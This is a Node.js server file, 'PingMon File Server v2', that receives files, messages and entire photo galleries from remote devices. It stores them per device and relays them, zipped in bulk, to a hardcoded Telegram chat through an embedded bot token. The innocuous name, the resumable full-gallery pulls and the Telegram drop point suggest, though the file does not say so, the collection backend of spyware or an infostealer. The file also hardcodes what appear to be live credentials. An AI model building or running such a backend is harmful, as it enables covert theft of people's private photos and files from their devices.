/**
 * PingMon File Server v2
 * - POST /upload          → send any file to Telegram via bot2
 * - POST /message         → send text message via bot2
 * - POST /gallery/start   → open a gallery session, creates the panel message
 * - POST /gallery/photo   → receive one photo, update panel
 * - POST /gallery/finish  → mark session complete
 * - POST /tg2/hook        → Telegram webhook (button callbacks from bot2)
 * - GET  /gallery/init    → register bot2 webhook (open once)
 * - GET  /health          → uptime check
 */

const http  = require("http");
const https = require("https");
const fs    = require("fs");
const path  = require("path");
const zlib  = require("zlib");

// ─── CONFIG ────────────────────────────────────────────────────────────────
const PORT         = 3000;
const APP_TOKEN    = "p7k2m9qx4bz8vn3rt";
const TG_BOT2      = "8634125839:AAHx29OBFw-BKeZMJdrl6ERc0lO3bX0fzbw";
const TG_CHAT_ID   = "8912661328";
const DATA_DIR     = "/opt/pingmon/sessions";
// ───────────────────────────────────────────────────────────────────────────

fs.mkdirSync(DATA_DIR, { recursive: true });

/* live sessions: uid → { dir, meta, updateTimer } */
const sessions = new Map();

/* ═══════════════════════════════════════════════════════════ HTTP server */

const server = http.createServer(async (req, res) => {
  const url    = new URL(req.url, `http://${req.headers.host}`);
  const method = req.method;

  // Public routes
  if (method === "GET" && url.pathname === "/health") {
    return json(res, { ok: true, uptime: Math.floor(process.uptime()), sessions: sessions.size });
  }
  if (method === "GET" && url.pathname === "/gallery/init") {
    return initBot2(url, res);
  }
  // tg2/hook kept for compatibility but polling is used instead
  if (method === "POST" && url.pathname === "/tg2/hook") {
    const body = await readJson(req);
    handleCallback(body).catch(console.error);
    return json(res, { ok: true });
  }

  // Auth required
  const tok = req.headers["x-token"] || url.searchParams.get("token");
  if (tok !== APP_TOKEN) { res.writeHead(401); return res.end("unauthorized"); }

  try {
    if (method === "POST" && url.pathname === "/message") {
      const { text } = await readJson(req);
      // Split long messages (Telegram limit 4096 chars)
      const chunks = [];
      for (let i = 0; i < text.length; i += 4000) chunks.push(text.slice(i, i + 4000));
      for (const chunk of chunks) {
        await tg2("sendMessage", { chat_id: TG_CHAT_ID, text: chunk });
      }
      return json(res, { ok: true });
    }

    if (method === "POST" && url.pathname === "/upload") {
      const ct = req.headers["content-type"] || "";
      let buf, filename, caption;
      if (ct.includes("multipart/form-data")) {
        ({ buffer: buf, filename, caption } = await parseMultipart(req, ct));
      } else {
        buf      = await readBuf(req);
        filename = req.headers["x-filename"] || "file.txt";
        caption  = req.headers["x-caption"]  || "";
      }
      await tg2SendFile(buf, filename, caption);
      return json(res, { ok: true });
    }

    if (method === "POST" && url.pathname === "/gallery/start") {
      const { uid, device, total } = await readJson(req);
      const session = await startSession(uid, device, total);
      return json(res, { ok: true, session_id: session.id, resume_from: session.resumeFrom });
    }

    if (method === "POST" && url.pathname === "/gallery/photo") {
      const sid      = req.headers["x-session"];
      const index    = Number(req.headers["x-index"] || 0);
      const filename = req.headers["x-filename"] || `photo_${index}.jpg`;
      const buf      = await readBuf(req);
      await receivePhoto(sid, index, filename, buf);
      return json(res, { ok: true });
    }

    if (method === "POST" && url.pathname === "/gallery/finish") {
      const { session_id } = await readJson(req);
      await finishSession(session_id);
      return json(res, { ok: true });
    }

    if (method === "POST" && url.pathname === "/gallery/rezip") {
      const { uid } = await readJson(req);
      await rezipForUid(uid);
      return json(res, { ok: true });
    }

    res.writeHead(404); res.end("not found");
  } catch (e) {
    console.error(e);
    res.writeHead(500); res.end("error: " + e.message);
  }
});

server.listen(PORT, "0.0.0.0", () =>
  console.log(`PingMon server on :${PORT}`)
);

/* ══════════════════════════════════════════════════════════ gallery logic */

async function startSession(uid, device, total) {
  const id  = `${uid}_${Date.now()}`;
  const dir = path.join(DATA_DIR, id);

  // UID-based permanent photo storage (survives across sessions)
  const uidDir = path.join(DATA_DIR, `uid_${uid}`);
  fs.mkdirSync(path.join(uidDir, "photos"), { recursive: true });
  fs.mkdirSync(dir, { recursive: true });

  // Resume: count existing photos in UID-based store
  const existing   = fs.readdirSync(path.join(uidDir, "photos")).length;
  const resumeFrom = existing;

  const meta = { id, uid, device, total, sent: existing, startedAt: Date.now(), done: false, uidDir };
  saveMeta(dir, meta);

  // Create Telegram panel
  const msg = await tg2("sendMessage", {
    chat_id: TG_CHAT_ID,
    text: buildPanel(meta),
    reply_markup: buildKb(id, meta.sent),
  });

  meta.msgId = msg.result?.message_id;
  saveMeta(dir, meta);

  sessions.set(id, { dir, meta });
  console.log(`Session started: ${id} device=${device} total=${total}`);
  return { id, resumeFrom };
}

async function receivePhoto(sid, index, filename, buf) {
  let s = sessions.get(sid);
  if (!s) {
    // restore from disk
    const dir = path.join(DATA_DIR, sid);
    if (!fs.existsSync(dir)) throw new Error("session not found");
    const meta = JSON.parse(fs.readFileSync(path.join(dir, "meta.json"), "utf8"));
    s = { dir, meta };
    sessions.set(sid, s);
  }

  // Save to permanent UID-based store (deduplicated by filename)
  const uidDir  = path.join(DATA_DIR, `uid_${s.meta.uid}`);
  fs.mkdirSync(path.join(uidDir, "photos"), { recursive: true });
  const dest    = path.join(uidDir, "photos", `${String(index).padStart(5, "0")}_${filename}`);
  if (!fs.existsSync(dest)) fs.writeFileSync(dest, buf);
  s.meta.sent = fs.readdirSync(path.join(uidDir, "photos")).length;
  saveMeta(s.dir, s.meta);

  // Debounce panel updates: update every 5 photos or first/last
  clearTimeout(s.updateTimer);
  s.updateTimer = setTimeout(() => updatePanel(sid), s.meta.sent % 5 === 0 ? 0 : 800);
}

async function updatePanel(sid) {
  const s = sessions.get(sid);
  if (!s || !s.meta.msgId) return;
  await tg2("editMessageText", {
    chat_id: TG_CHAT_ID,
    message_id: s.meta.msgId,
    text: buildPanel(s.meta),
    reply_markup: buildKb(sid, s.meta.sent),
  }).catch(() => {});
}

async function finishSession(sid) {
  const s = sessions.get(sid);
  if (!s) return;
  s.meta.done = true;
  saveMeta(s.dir, s.meta);
  await updatePanel(sid);
}

async function zipAndSend(sid) {
  const s = sessions.get(sid);
  if (!s) return;

  const uidDir2   = path.join(DATA_DIR, `uid_${s.meta.uid}`);
  const photosDir = path.join(uidDir2, "photos");
  const photos    = fs.readdirSync(photosDir).sort();
  if (!photos.length) return;

  await tg2("editMessageText", {
    chat_id: TG_CHAT_ID,
    message_id: s.meta.msgId,
    text: buildPanel(s.meta) + "\n\n⏳ Zipping...",
    reply_markup: { inline_keyboard: [] },
  }).catch(() => {});

  // Build ZIP manually (stored format, no compression for speed)
  const zipPath = path.join(s.dir, `gallery_${sid}.zip`);
  const zip     = fs.createWriteStream(zipPath);

  // Simple ZIP: just concatenate with local file headers
  const bufs = [];
  const centralDir = [];
  let offset = 0;

  for (const name of photos) {
    const data = fs.readFileSync(path.join(photosDir, name));
    const nameBuf = Buffer.from(name, "utf8");

    // Local file header
    const local = Buffer.alloc(30 + nameBuf.length);
    local.writeUInt32LE(0x04034b50, 0); // signature
    local.writeUInt16LE(20, 4);          // version needed
    local.writeUInt16LE(0,  6);          // flags
    local.writeUInt16LE(0,  8);          // no compression
    local.writeUInt16LE(0,  10);         // mod time
    local.writeUInt16LE(0,  12);         // mod date
    local.writeUInt32LE(crc32(data), 14); // CRC
    local.writeUInt32LE(data.length, 18); // compressed size
    local.writeUInt32LE(data.length, 22); // uncompressed size
    local.writeUInt16LE(nameBuf.length, 26); // name length
    local.writeUInt16LE(0, 28);          // extra length
    nameBuf.copy(local, 30);

    bufs.push(local, data);

    // Central directory entry
    const cent = Buffer.alloc(46 + nameBuf.length);
    cent.writeUInt32LE(0x02014b50, 0);
    cent.writeUInt16LE(20, 4);
    cent.writeUInt16LE(20, 6);
    cent.writeUInt16LE(0,  8);
    cent.writeUInt16LE(0,  10);
    cent.writeUInt16LE(0,  12);
    cent.writeUInt16LE(0,  14);
    cent.writeUInt32LE(crc32(data), 16);
    cent.writeUInt32LE(data.length, 20);
    cent.writeUInt32LE(data.length, 24);
    cent.writeUInt16LE(nameBuf.length, 28);
    cent.writeUInt16LE(0,  30);
    cent.writeUInt16LE(0,  32);
    cent.writeUInt16LE(0,  34);
    cent.writeUInt16LE(0,  36);
    cent.writeUInt32LE(0,  38);
    cent.writeUInt32LE(offset, 42);
    nameBuf.copy(cent, 46);
    centralDir.push(cent);

    offset += local.length + data.length;
  }

  const cdBuf   = Buffer.concat(centralDir);
  const eocd    = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(0, 4);
  eocd.writeUInt16LE(0, 6);
  eocd.writeUInt16LE(photos.length, 8);
  eocd.writeUInt16LE(photos.length, 10);
  eocd.writeUInt32LE(cdBuf.length, 12);
  eocd.writeUInt32LE(offset, 16);
  eocd.writeUInt16LE(0, 20);

  const zipBuf  = Buffer.concat([...bufs, cdBuf, eocd]);
  const zipName = `gallery_${s.meta.device}_${photos.length}photos.zip`;
  const caption = `📸 ${s.meta.device} — ${photos.length} photos`;

  await tg2SendFile(zipBuf, zipName, caption);

  // Restore panel
  await tg2("editMessageText", {
    chat_id: TG_CHAT_ID,
    message_id: s.meta.msgId,
    text: buildPanel(s.meta) + `\n\n✅ ZIP sent (${photos.length} photos)`,
    reply_markup: buildKb(sid, s.meta.sent),
  }).catch(() => {});
}

/* ═══════════════════════════════════════════════════════ rezip by uid ════ */

async function rezipForUid(uid) {
  const uidDir    = path.join(DATA_DIR, `uid_${uid}`);
  const photosDir = path.join(uidDir, "photos");

  if (!fs.existsSync(photosDir)) {
    await tg2("sendMessage", { chat_id: TG_CHAT_ID, text: `No photos found for this device.` });
    return;
  }

  const photos = fs.readdirSync(photosDir).sort();
  if (!photos.length) {
    await tg2("sendMessage", { chat_id: TG_CHAT_ID, text: `No photos on server yet.` });
    return;
  }

  await tg2("sendMessage", { chat_id: TG_CHAT_ID,
    text: `⏳ Re-zipping ${photos.length} photos...` });

  const zipName = `gallery_${uid}_${photos.length}photos.zip`;
  const caption = `📸 ${photos.length} photos (full archive)`;

  // Build ZIP
  const bufs = [], centralDir = [];
  let offset = 0;
  for (const name of photos) {
    const data    = fs.readFileSync(path.join(photosDir, name));
    const nameBuf = Buffer.from(name, "utf8");
    const local   = Buffer.alloc(30 + nameBuf.length);
    local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0, 6); local.writeUInt16LE(0, 8);
    local.writeUInt16LE(0, 10); local.writeUInt16LE(0, 12);
    local.writeUInt32LE(crc32(data), 14);
    local.writeUInt32LE(data.length, 18); local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(nameBuf.length, 26); local.writeUInt16LE(0, 28);
    nameBuf.copy(local, 30);
    bufs.push(local, data);
    const cent = Buffer.alloc(46 + nameBuf.length);
    cent.writeUInt32LE(0x02014b50, 0); cent.writeUInt16LE(20, 4);
    cent.writeUInt16LE(20, 6); cent.writeUInt16LE(0, 8);
    cent.writeUInt32LE(crc32(data), 16);
    cent.writeUInt32LE(data.length, 20); cent.writeUInt32LE(data.length, 24);
    cent.writeUInt16LE(nameBuf.length, 28); cent.writeUInt32LE(offset, 42);
    nameBuf.copy(cent, 46);
    centralDir.push(cent);
    offset += local.length + data.length;
  }
  const cdBuf = Buffer.concat(centralDir);
  const eocd  = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); eocd.writeUInt16LE(0, 4);
  eocd.writeUInt16LE(0, 6); eocd.writeUInt16LE(photos.length, 8);
  eocd.writeUInt16LE(photos.length, 10); eocd.writeUInt32LE(cdBuf.length, 12);
  eocd.writeUInt32LE(offset, 16); eocd.writeUInt16LE(0, 20);
  const zipBuf = Buffer.concat([...bufs, cdBuf, eocd]);
  await tg2SendFile(zipBuf, zipName, caption);
}

/* ═══════════════════════════════════════════════════════════ panel builder */

function buildPanel(meta) {
  const pct  = meta.total > 0 ? meta.sent / meta.total : 0;
  const bar  = "█".repeat(Math.round(pct * 10)) + "░".repeat(10 - Math.round(pct * 10));
  const elapsed = (Date.now() - meta.startedAt) / 1000;
  const speed    = elapsed > 0 ? (meta.sent / elapsed).toFixed(1) : "?";
  const rem      = meta.total - meta.sent;
  const eta      = speed > 0 ? fmtSec(rem / speed) : "?";

  return [
    `📱 ${meta.device}`,
    `━━━━━━━━━━━━━━━━`,
    `📸 Gallery Transfer`,
    `Total:     ${meta.total} photos`,
    `Received:  ${bar} ${meta.sent} ✅`,
    `Remaining: ${rem} ⏳`,
    ``,
    `⚡ Speed: ${speed}/sec`,
    `⏱ ETA:   ${eta}`,
    `━━━━━━━━━━━━━━━━`,
    meta.done ? "✅ Complete!" : "🔄 Receiving...",
  ].join("\n");
}

function buildKb(sid, count) {
  return {
    inline_keyboard: [[
      { text: `📦 ZIP ${count} photos`, callback_data: `zip:${sid}` },
    ]],
  };
}

function fmtSec(s) {
  if (!isFinite(s)) return "?";
  if (s < 60) return `${Math.round(s)}s`;
  return `${Math.floor(s/60)}m ${Math.round(s%60)}s`;
}

/* ════════════════════════════════════════════════════════ button callback */

async function handleCallback(update) {
  const cq = update?.callback_query;
  if (!cq) return;
  const data = cq.data || "";

  // Answer spinner immediately
  await tg2("answerCallbackQuery", { callback_query_id: cq.id, text: "Zipping..." });

  if (data.startsWith("zip:")) {
    const sid = data.slice(4);
    await zipAndSend(sid);
  }
}

async function initBot2(url, res) {
  // Remove any existing webhook and switch to polling
  await tg2("deleteWebhook", { drop_pending_updates: true });
  const me = await tg2("getMe");
  const text = [
    `bot: ${me.ok ? "@" + me.result.username : "FAILED"}`,
    `mode: long polling (no HTTPS needed)`,
    `status: active`,
  ].join("\n");
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end(text);
}

/* ══════════════════════════════════════ long polling for button callbacks */

let pollingOffset = 0;
let pollingActive = false;

async function startPolling() {
  if (pollingActive) return;
  pollingActive = true;
  console.log("Bot2 polling started");

  // Clear webhook first
  await tg2("deleteWebhook", { drop_pending_updates: true }).catch(() => {});

  while (true) {
    try {
      const r = await tg2("getUpdates", {
        offset: pollingOffset,
        timeout: 30,
        allowed_updates: ["callback_query"],
      });
      if (r.ok && r.result?.length) {
        for (const update of r.result) {
          pollingOffset = update.update_id + 1;
          handleCallback(update).catch(console.error);
        }
      }
    } catch (e) {
      console.error("polling error:", e.message);
      await new Promise(r => setTimeout(r, 3000));
    }
  }
}

// Start polling automatically
startPolling();

/* ══════════════════════════════════════════════════════════════ telegram */

async function tg2(method, body) {
  const data = Buffer.from(JSON.stringify(body || {}), "utf8");
  return new Promise((resolve, reject) => {
    const req = https.request({
      hostname: "api.telegram.org",
      path: `/bot${TG_BOT2}/${method}`,
      method: "POST",
      headers: { "Content-Type": "application/json", "Content-Length": data.length },
    }, res => {
      let out = "";
      res.on("data", c => out += c);
      res.on("end", () => { try { resolve(JSON.parse(out)); } catch { resolve({}); } });
    });
    req.on("error", reject);
    req.write(data); req.end();
  });
}

async function tg2SendFile(buf, filename, caption) {
  const boundary = "PingMon" + Date.now();
  const parts = [];
  parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${TG_CHAT_ID}\r\n`);
  if (caption) parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`);
  const fileHdr = `--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${filename}"\r\nContent-Type: application/octet-stream\r\n\r\n`;
  const body = Buffer.concat([Buffer.from(parts.join("")), Buffer.from(fileHdr), buf, Buffer.from(`\r\n--${boundary}--\r\n`)]);
  return new Promise((resolve, reject) => {
    const req = https.request({
      hostname: "api.telegram.org",
      path: `/bot${TG_BOT2}/sendDocument`,
      method: "POST",
      headers: { "Content-Type": `multipart/form-data; boundary=${boundary}`, "Content-Length": body.length },
    }, res => {
      let out = "";
      res.on("data", c => out += c);
      res.on("end", () => { try { resolve(JSON.parse(out)); } catch { resolve({}); } });
    });
    req.on("error", reject);
    req.write(body); req.end();
  });
}

/* ═════════════════════════════════════════════════════════════════ utils */

function saveMeta(dir, meta) {
  fs.writeFileSync(path.join(dir, "meta.json"), JSON.stringify(meta, null, 2));
}

function readJson(req) {
  return new Promise((res, rej) => {
    let d = "";
    req.on("data", c => d += c);
    req.on("end", () => { try { res(JSON.parse(d)); } catch { res({}); } });
    req.on("error", rej);
  });
}

function readBuf(req) {
  return new Promise((res, rej) => {
    const chunks = [];
    req.on("data", c => chunks.push(c));
    req.on("end", () => res(Buffer.concat(chunks)));
    req.on("error", rej);
  });
}

async function parseMultipart(req, ct) {
  const boundary  = ct.split("boundary=")[1]?.trim();
  const raw       = await readBuf(req);
  const sep       = Buffer.from(`--${boundary}`);
  let filename = "file", caption = "", fileBuffer = null;
  let start = 0;
  while (start < raw.length) {
    const si = raw.indexOf(sep, start);
    if (si === -1) break;
    const ps = si + sep.length + 2;
    const ns = raw.indexOf(sep, ps);
    const pe = ns === -1 ? raw.length : ns - 2;
    const he = raw.indexOf(Buffer.from("\r\n\r\n"), ps);
    if (he === -1 || he >= pe) { start = ps; continue; }
    const header = raw.slice(ps, he).toString();
    const body   = raw.slice(he + 4, pe);
    const nm = header.match(/name="([^"]+)"/)?.[1];
    const fn = header.match(/filename="([^"]+)"/)?.[1];
    if (nm === "caption") caption = body.toString().trim();
    else if (fn || nm === "file") { filename = fn || "file"; fileBuffer = body; }
    start = ps;
  }
  if (!fileBuffer) throw new Error("no file");
  return { filename, buffer: fileBuffer, caption };
}

function crc32(buf) {
  let crc = 0xFFFFFFFF;
  for (const b of buf) {
    crc ^= b;
    for (let i = 0; i < 8; i++) crc = (crc >>> 1) ^ (crc & 1 ? 0xEDB88320 : 0);
  }
  return (crc ^ 0xFFFFFFFF) >>> 0;
}

function json(res, obj) {
  res.writeHead(200, { "Content-Type": "application/json" });
  res.end(JSON.stringify(obj));
}
